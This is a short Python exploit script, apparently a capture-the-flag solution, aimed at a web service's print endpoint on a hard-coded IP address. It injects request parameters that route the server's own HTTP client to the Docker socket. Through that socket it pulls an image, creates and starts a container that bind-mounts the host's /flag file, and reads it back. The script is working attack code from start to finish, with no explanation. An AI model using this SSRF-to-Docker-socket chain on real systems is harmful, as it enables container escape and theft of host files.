import requests as req
import random
import string
from bs4 import BeautifulSoup
from urllib import quote as urlencode

URL = "http://54.183.55.10/print?{url}&url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ"

headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
}


def get(u):
    res = req.get(u, timeout=10, headers=headers)
    if res.status_code == 200:
        soup = BeautifulSoup(res.content, "lxml")
        body = soup.select(".markdown-body")
        if body:
            print(body[0].text)
            return True
    print("[-] error")


def fuck(_u):
    _u += '&url[socketPath]=/var/run/docker.sock'
    pl = URL.format(url=_u)
    try:
        get(pl)
    except:
        pass

if __name__ == '__main__':
    container_name = ''.join(random.sample(
        string.ascii_letters + string.digits, 6))
    _us = [
        'url[url]=/_ping&',
        'url[method]=post&url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest',
        'url[method]=post&url[url]=http://127.0.0.1/containers/create?name=%s&url[data][Image]=alpine:latest&url[data][Volumes][flag][path]=/getflag&url[data][Binds][]=/flag:/getflag:ro&url[data][Entrypoint][]=/bin/ls' % container_name,
        'url[method]=post&url[url]=http://127.0.0.1/containers/%s/start' % container_name,
        'url[method]=get&url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name
    ]
    for i in _us:
        fuck(i)
